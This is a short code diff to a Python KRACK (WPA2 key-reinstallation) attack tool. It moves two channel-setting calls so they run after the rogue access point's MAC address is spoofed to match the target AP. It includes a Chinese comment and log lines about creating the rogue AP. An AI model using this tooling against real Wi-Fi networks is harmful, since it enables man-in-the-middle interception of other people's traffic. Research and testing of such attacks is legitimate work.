@@ -578,14 +578,15 @@ class KRAckAttack():
 		elif self.netconfig.real_channel > 13:
 			log(WARNING, "Attack not yet tested against 5 GHz networks.")
 		self.netconfig.find_rogue_channel()
-		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
-		self.sock_real.set_channel(self.netconfig.real_channel)
 
 		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
 		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
 		# 將強盜 AP 的 MAC addr. 設成原始 AP 的 MAC addr.
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
+
+		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
+		self.sock_real.set_channel(self.netconfig.real_channel)
 
 		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
 		if self.nic_real_clientack: 
